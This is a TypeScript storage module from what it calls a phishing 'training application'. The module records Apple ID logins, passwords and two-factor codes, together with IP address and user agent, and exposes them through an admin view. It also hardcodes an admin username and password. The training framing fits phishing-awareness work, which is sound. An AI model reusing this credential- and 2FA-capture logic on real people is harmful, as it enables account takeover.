import { Credential, TrainingSession } from '../types';
import { generateId, getCurrentTimestamp, getMockIpAddress } from '../utils/helpers';

// Mock storage in memory for the training application
const credentials: Credential[] = [];
const sessions: TrainingSession[] = [];

// Admin credentials (in a real app, this would be securely stored)
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'training2025';

export const storageService = {
  // Credential capture methods
  saveCredential: (appleId: string, password: string): string => {
    const id = generateId();
    const credential: Credential = {
      id,
      timestamp: getCurrentTimestamp(),
      appleId,
      password,
      twoFactorCode: '',
      ipAddress: getMockIpAddress(),
      userAgent: navigator.userAgent
    };
    
    credentials.push(credential);
    return id;
  },
  
  updateCredentialWithTwoFactor: (id: string, twoFactorCode: string): void => {
    const credential = credentials.find(cred => cred.id === id);
    if (credential) {
      credential.twoFactorCode = twoFactorCode;
    }
  },
  
  getCredentials: (): Credential[] => {
    return [...credentials];
  },
  
  // Session tracking methods
  startSession: (): string => {
    const id = generateId();
    const session: TrainingSession = {
      id,
      startTime: getCurrentTimestamp(),
      endTime: null,
      completedSteps: []
    };
    
    sessions.push(session);
    return id;
  },
  
  updateSession: (id: string, step: string): void => {
    const session = sessions.find(s => s.id === id);
    if (session) {
      session.completedSteps.push(step);
    }
  },
  
  endSession: (id: string): void => {
    const session = sessions.find(s => s.id === id);
    if (session) {
      session.endTime = getCurrentTimestamp();
    }
  },
  
  getSessions: (): TrainingSession[] => {
    return [...sessions];
  },
  
  // Admin authentication
  verifyAdminCredentials: (username: string, password: string): boolean => {
    return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
  }
};